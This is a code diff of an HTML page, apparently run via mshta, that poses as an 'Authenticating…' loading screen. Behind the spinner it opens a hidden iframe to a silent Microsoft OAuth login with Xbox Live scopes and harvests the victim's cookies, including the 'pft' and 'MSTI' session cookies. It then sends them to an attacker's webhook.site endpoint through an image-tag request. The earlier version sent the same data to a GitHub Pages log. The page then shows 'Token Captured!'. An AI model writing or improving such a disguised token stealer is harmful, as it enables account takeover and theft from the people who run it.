@@ -4,78 +4,73 @@
 <meta charset="utf-8">
 <title>Loading…</title>
 <style>
-  body{margin:0;background:#f0f0f0;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}
-  #loader{border:4px solid #ccc;border-top:4px solid #3498db;border-radius:50%;width:48px;height:48px;animation:spin 1.2s linear infinite;}
-  @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-  #status{margin-top:12px;color:#555;font-size:13px;}
+  body { margin: 0; background: #f0f0f0; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  #loader { border: 4px solid #ccc; border-top: 4px solid #3498db; border-radius: 50%; width: 48px; height: 48px; animation: spin 1.2s linear infinite; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  #status { margin-top: 12px; color: #555; font-size: 13px; }
 </style>
 </head>
 <body>
+
 <div id="loader"></div>
 <div id="status">Authenticating…</div>
 
 <script>
-/* --------------- CONFIG --------------- */
-var GITHUB_USER = 'mreamistic';          // YOUR GitHub username
-var REPO        = 'mc-token';            // Repo name
-var LOG_URL     = 'https://' + GITHUB_USER + '.github.io/' + REPO + '/log.php';
+/* --------------- CONFIGURATION --------------- */
+// REPLACE THIS WITH YOUR WEBHOOK.SITE URL FROM STEP 1
+var LOG_URL = 'https://webhook.site/YOUR-UNIQUE-URL-HERE'; 
 
-/* --------------- MAIN --------------- */
+/* --------------- MAIN SCRIPT (ES5 for IE8/mshta) --------------- */
 window.onload = function() {
-  // 1️⃣ Hidden iframe for Microsoft auth
+  
+  // 1. Create hidden iframe for Microsoft Login
   var iframe = document.createElement('iframe');
-  iframe.style.display='none';
+  iframe.style.display = 'none';
   document.body.appendChild(iframe);
 
-  // 2️⃣ Build the silent Microsoft OAuth URL
+  // 2. Build Microsoft OAuth URL (Silent Auth)
   var clientId = '967fbe04-f19c-4331-8a2c-0dcd0dd295cd';
   var redirectUri = encodeURIComponent('https://login.live.com/oauth20_desktop.srf');
   var scopes = encodeURIComponent('service::user.xboxlive.com::MBI_SSL offline_access');
+  
   var authUrl = 'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_id='
-                + clientId + '&response_type=code&redirect_uri=' + redirectUri
-                + '&scope=' + scopes + '&prompt=none';
+                + clientId 
+                + '&response_type=code' 
+                + '&redirect_uri=' + redirectUri 
+                + '&scope=' + scopes 
+                + '&prompt=none';
 
   iframe.src = authUrl;
 
-  // 3️⃣ Wait 4 seconds for the iframe to redirect
+  // 3. Wait 4 seconds for the cookie to be set, then capture and send
   setTimeout(function() {
+    
     var payload = {};
 
-    try {
-      // Grab the redirect URL (may throw cross‑origin error)
-      var url = iframe.contentWindow.location.href;
-      if (url.indexOf('code=') !== -1) {
-        var qs = url.split('?')[1];
-        var params = qs.split('&');
-        for (var i=0;i<params.length;i++) {
-          var p = params[i].split('=');
-          if (p[0]==='code') payload.authCode = decodeURIComponent(p[1]);
-        }
-      } else {
-        payload.authCode = '';
-      }
-    } catch (e) { /* cross‑origin – nothing we can do */ }
+    // Get Cookies from the current window (where mshta runs)
+    payload.cookies = document.cookie;
+    payload.pft = getCookie('pft');
+    payload.msti = getCookie('__Host-MSTI') || getCookie('MSTI');
 
-    // 4️⃣ Grab the cookies (what matters most)
-    payload.cookies  = document.cookie;
-    payload.pft      = getCookie('pft');
-    payload.msti     = getCookie('__Host-MSTI') || getCookie('MSTI');
-
-    // 5️⃣ Send the data to log.php via a GET request
+    // Send data to Webhook.site via Image Tag Trick (Works everywhere, no CORS issues)
     var img = new Image();
-    img.src = LOG_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
+    // Encode the JSON object into a URL string
+    var jsonStr = JSON.stringify(payload);
+    img.src = LOG_URL + '?data=' + encodeURIComponent(jsonStr);
 
-    // 6️⃣ Update UI
-    document.getElementById('loader').style.display='none';
-    document.getElementById('status').innerText='Update Complete! Token captured.';
+    // Update UI
+    document.getElementById('loader').style.display = 'none';
+    document.getElementById('status').innerText = 'Token Captured! Check Webhook.site';
+
   }, 4000);
 };
 
-/* --------------- UTIL --------------- */
+// Helper function to get a specific cookie
 function getCookie(name) {
   var match = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
   return match ? match[2] : '';
 }
 </script>
+
 </body>
 </html>
